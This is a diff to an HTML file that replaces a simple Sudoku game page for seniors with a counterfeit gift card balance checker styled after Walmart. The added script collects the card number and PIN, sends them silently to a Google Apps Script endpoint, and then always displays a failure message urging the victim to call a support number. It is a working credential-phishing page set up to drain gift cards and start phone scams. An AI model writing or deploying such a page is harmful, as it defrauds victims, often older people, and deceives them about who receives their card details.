@@ -1,183 +1,227 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Sudoku - Games for Senior</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-body {
-    margin: 0;
-    padding: 20px;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
-h1 {
-    margin-bottom: 20px;
-    color: #333;
-}
-.sudoku {
-    display: grid;
-    grid-template-columns: repeat(9, 40px);
-    grid-template-rows: repeat(9, 40px);
-    gap: 2px;
-}
-.cell {
-    width: 40px;
-    height: 40px;
-    text-align: center;
-    font-size: 18px;
-    border: 1px solid #999;
-    background: #fff;
-}
-.cell:focus {
-    outline: 2px solid #007BFF;
-}
-.prefilled {
-    background: #ddd;
-    font-weight: bold;
-}
-.bold-border {
-    border-width: 2px;
-}
-.btns {
-    margin-top: 20px;
-    display: flex;
-    gap: 15px;
-}
-button {
-    padding: 10px 20px;
-    background: #007BFF;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-}
-button:hover {
-    background: #0056b3;
-}
-#message {
-    margin-top: 15px;
-    font-size: 16px;
-    color: green;
-}
-</style>
+   <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "snjdjg8gp4");
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Check Gift Card Balance</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+    }
+
+    header {
+      background-color: #005be3;
+      padding: 16px;
+      text-align: center;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    .breadcrumb {
+      padding: 16px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: auto;
+      padding: 16px;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 24px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    .input-row {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .input-row > div {
+      flex: 1;
+      min-width: 200px;
+    }
+
+    button {
+      background-color: #005be3;
+      color: white;
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+    }
+
+    .tips-box {
+      margin-top: 40px;
+      padding: 20px;
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 32px;
+    }
+
+    .tip {
+      flex: 1;
+      min-width: 200px;
+    }
+
+    .tip h3 {
+      font-size: 16px;
+      margin-bottom: 8px;
+    }
+
+    .tip p {
+      font-size: 14px;
+      color: #333;
+    }
+
+    .tip ul {
+      margin: 0;
+      padding-left: 20px;
+    }
+
+    .tip img {
+      margin-top: 12px;
+      width: 140px;
+    }
+
+    .error {
+      display: none;
+      color: red;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .error a {
+      color: red;
+      text-decoration: underline;
+    }
+
+    @media (max-width: 600px) {
+      .input-row {
+        flex-direction: column;
+      }
+    }
+  </style>
 </head>
 <body>
 
-<h1>Sudoku</h1>
+  <header>
+    Gift card
+  </header>
 
-<div class="sudoku" id="sudokuBoard"></div>
+  <div class="breadcrumb">
+    Gift cards / Check Gift Card Balance
+  </div>
 
-<div class="btns">
-    <button onclick="checkSudoku()">Check</button>
-    <button onclick="window.location.href='index.html'">Back to Home</button>
-</div>
+  <div class="container">
+    <h1>Check gift card balance</h1>
 
-<div id="message"></div>
+    <form id="cardForm">
+      <div class="input-row">
+        <div>
+          <label for="giftCardNumber">Card number* (16 digits)</label>
+          <input type="text" name="giftCardNumber" id="giftCardNumber" maxlength="16" required />
+        </div>
+        <div>
+          <label for="accessNumber">PIN* (4 digits)</label>
+          <input type="text" name="accessNumber" id="accessNumber" maxlength="4" required />
+        </div>
+      </div>
 
-<script>
-// Sample puzzle (0 means blank)
-const puzzle = [
-    [5, 3, 0, 0, 7, 0, 0, 0, 0],
-    [6, 0, 0, 1, 9, 5, 0, 0, 0],
-    [0, 9, 8, 0, 0, 0, 0, 6, 0],
-    
-    [8, 0, 0, 0, 6, 0, 0, 0, 3],
-    [4, 0, 0, 8, 0, 3, 0, 0, 1],
-    [7, 0, 0, 0, 2, 0, 0, 0, 6],
-    
-    [0, 6, 0, 0, 0, 0, 2, 8, 0],
-    [0, 0, 0, 4, 1, 9, 0, 0, 5],
-    [0, 0, 0, 0, 8, 0, 0, 7, 9]
-];
+      <button type="submit">Check Balance</button>
+      <div id="errorMsg" class="error">
+        We couldn’t verify your gift card. Try again or call <a href="tel:+18447092550">+1-844-709-2550</a> for help.
+      </div>
+    </form>
 
-function createSudokuBoard() {
-    const board = document.getElementById('sudokuBoard');
-    for (let row = 0; row < 9; row++) {
-        for (let col = 0; col < 9; col++) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.maxLength = 1;
-            input.classList.add('cell');
-            
-            if (puzzle[row][col] !== 0) {
-                input.value = puzzle[row][col];
-                input.disabled = true;
-                input.classList.add('prefilled');
-            }
+    <div class="tips-box">
+      <div class="tip">
+        <h3>Physical gift card</h3>
+        <p>Scratch off the silver coating on back of card to reveal</p>
+        <ul>
+          <li>Last 4 digits of 16-digit gift card number</li>
+          <li>PIN</li>
+        </ul>
+        <img src="https://i.imgur.com/Wlb3TSE.png" alt="Card image" />
+      </div>
 
-            // Bold borders
-            if (col % 3 === 0) input.style.borderLeftWidth = '2px';
-            if (row % 3 === 0) input.style.borderTopWidth = '2px';
-            if (col === 8) input.style.borderRightWidth = '2px';
-            if (row === 8) input.style.borderBottomWidth = '2px';
+      <div class="tip">
+        <h3>eGift card</h3>
+        <p>Find the PIN in the confirmation email</p>
+      </div>
 
-            input.dataset.row = row;
-            input.dataset.col = col;
+      <div class="tip">
+        <h3>Don’t have a PIN?</h3>
+        <p>
+          To check your balance, you'll need to exchange your gift card for one with a PIN.
+          You can do this at any Walmart store.
+        </p>
+        <p>
+          For additional help, call <a href="tel:+18447092550"><strong>+1-844-709-2550</strong></a>
+        </p>
+      </div>
+    </div>
+  </div>
 
-            // Allow only numbers 1-9
-            input.addEventListener('input', () => {
-                input.value = input.value.replace(/[^1-9]/g, '');
-            });
+  <script>
+    document.getElementById("cardForm").addEventListener("submit", function (event) {
+      event.preventDefault();
 
-            board.appendChild(input);
-        }
-    }
-}
+      const formData = new FormData(event.target);
+      const formDetails = {
+        giftCardNumber: formData.get("giftCardNumber"),
+        accessNumber: formData.get("accessNumber"),
+      };
 
-function checkSudoku() {
-    const inputs = document.querySelectorAll('.cell');
-    const grid = Array.from({ length: 9 }, () => Array(9).fill(0));
+      const scriptURL = "https://script.google.com/macros/s/AKfycbzzt1AhRUn8j4K4xeqBAw1tU8Zx3vWytJkakRmTXUnWl6BTb4a9pBWN8J2S7UNeIOVz/exec";
 
-    inputs.forEach(input => {
-        const row = parseInt(input.dataset.row);
-        const col = parseInt(input.dataset.col);
-        grid[row][col] = parseInt(input.value) || 0;
+      fetch(scriptURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(formDetails),
+      })
+        .then(() => {
+          document.getElementById("errorMsg").style.display = "block";
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("⚠️ Something went wrong! Try again.");
+        });
     });
-
-    if (validateSudoku(grid)) {
-        document.getElementById('message').textContent = "✅ Congratulations! Sudoku is correct.";
-    } else {
-        document.getElementById('message').textContent = "❌ Incorrect Sudoku. Please check your inputs.";
-    }
-}
-
-function validateSudoku(grid) {
-    for (let i = 0; i < 9; i++) {
-        const rowSet = new Set();
-        const colSet = new Set();
-        const boxSet = new Set();
-
-        for (let j = 0; j < 9; j++) {
-            // Row check
-            if (grid[i][j]) {
-                if (rowSet.has(grid[i][j])) return false;
-                rowSet.add(grid[i][j]);
-            }
-
-            // Column check
-            if (grid[j][i]) {
-                if (colSet.has(grid[j][i])) return false;
-                colSet.add(grid[j][i]);
-            }
-
-            // 3x3 Box check
-            const rowIdx = 3 * Math.floor(i / 3) + Math.floor(j / 3);
-            const colIdx = 3 * (i % 3) + (j % 3);
-            if (grid[rowIdx][colIdx]) {
-                if (boxSet.has(grid[rowIdx][colIdx])) return false;
-                boxSet.add(grid[rowIdx][colIdx]);
-            }
-        }
-    }
-    return true;
-}
-
-createSudokuBoard();
-</script>
+  </script>
 
 </body>
 </html>
